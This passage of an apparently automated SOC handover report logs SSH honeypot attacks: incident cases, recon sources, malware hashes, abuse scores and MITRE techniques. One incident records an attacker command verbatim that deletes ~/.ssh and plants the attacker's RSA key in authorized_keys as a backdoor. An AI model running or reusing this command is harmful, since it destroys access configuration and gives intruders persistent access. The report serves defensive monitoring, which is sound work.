| **Source IP** | `39.117.79[.]36` |
| **First Seen** | 2026-04-15 20:53 |
| **Last Seen** | 2026-04-15 20:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:53:42` | `cowrie.session.connect` |
| `2026-04-15 20:53:42` | `cowrie.client.version` |
| `2026-04-15 20:53:42` | `cowrie.client.kex` |
| `2026-04-15 20:53:43` | `cowrie.login.success` |
| `2026-04-15 20:53:43` | `cowrie.session.params` |
| `2026-04-15 20:53:43` | `cowrie.command.input` |
| `2026-04-15 20:53:43` | `cowrie.command.failed` |
| `2026-04-15 20:53:43` | `cowrie.log.closed` |
| `2026-04-15 20:53:44` | `cowrie.session.params` |
| `2026-04-15 20:53:44` | `cowrie.command.input` |
| `2026-04-15 20:53:44` | `cowrie.session.file_download` |
| `2026-04-15 20:53:44` | `cowrie.log.closed` |
| `2026-04-15 20:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.117.79[.]36` to AbuseIPDB if not already reported
- [ ] Block `39.117.79[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-492316c460d9

| Field | Detail |
|---|---|
| **Source IP** | `39.117.79[.]36` |
| **First Seen** | 2026-04-15 20:53 |
| **Last Seen** | 2026-04-15 20:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:53:46` | `cowrie.session.connect` |
| `2026-04-15 20:53:46` | `cowrie.client.version` |
| `2026-04-15 20:53:46` | `cowrie.client.kex` |
| `2026-04-15 20:53:47` | `cowrie.login.success` |
| `2026-04-15 20:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.117.79[.]36` to AbuseIPDB if not already reported
- [ ] Block `39.117.79[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b163dc5e6d9

| Field | Detail |
|---|---|
| **Source IP** | `223.244.25[.]6` |
| **First Seen** | 2026-04-15 20:55 |
| **Last Seen** | 2026-04-15 20:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:55:45` | `cowrie.session.connect` |
| `2026-04-15 20:55:45` | `cowrie.client.version` |
| `2026-04-15 20:55:47` | `cowrie.client.kex` |
| `2026-04-15 20:55:48` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `223.244.25[.]6` to AbuseIPDB if not already reported
- [ ] Block `223.244.25[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.244.25[.]6` | **12** | 2026-04-15 20:49 | 2026-04-15 20:56 | 8m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.184[.]79` | **11** | 2026-04-15 20:49 | 2026-04-15 20:55 | 14m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `77.87.40[.]114` | **10** | 2026-04-15 19:24 | 2026-04-15 19:37 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.255.245[.]44` | **6** | 2026-04-15 20:50 | 2026-04-15 20:55 | 7m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.117.79[.]36` | **3** | 2026-04-15 20:48 | 2026-04-15 20:55 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `66.45.231[.]201` | **3** | 2026-04-15 20:50 | 2026-04-15 20:55 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-04-15 20:26 | 2026-04-15 20:26 | 10s | 0 | `T1592` | 🟢 LOW |
| `180.93.75[.]229` | 1 | 2026-04-15 20:14 | 2026-04-15 20:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.4.62[.]108` | 1 | 2026-04-15 20:04 | 2026-04-15 20:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.126.16[.]66` | 1 | 2026-04-15 19:48 | 2026-04-15 19:49 | 31s | 0 | `T1592` | 🟢 LOW |
| `64.227.109[.]89` | 1 | 2026-04-15 20:51 | 2026-04-15 20:51 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.227.109[.]89` | US | DigitalOcean, LLC | **100** ⚠️ | 28 |
| `180.93.75[.]229` | VN | Saigon Postel Corporation | **100** ⚠️ | 5 |
| `66.45.231[.]201` | US | Interserver, Inc | **100** ⚠️ | 1 |
| `42.4.62[.]108` | CN | UNICOM Liaoning Province Network | **100** ⚠️ | 2 |
| `77.87.40[.]114` | UA | Znet | **100** ⚠️ | 50 |
| `172.104.93[.]159` | JP | Linode | **100** ⚠️ | 50 |
| `59.126.16[.]66` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 34 |
| `180.76.184[.]79` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `223.244.25[.]6` | CN | CHINANET Anhui province network | **100** ⚠️ | 50 |
| `39.117.79[.]36` | KR | SK Broadband Co Ltd | **100** ⚠️ | 47 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 55 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 22 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 63 cases |
| Tool 34  | Credential Extractor        | ✅ 31 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (6.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 11 recon entry/entries in table (6 group(s) consolidating 45 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-15T20:57:01Z_
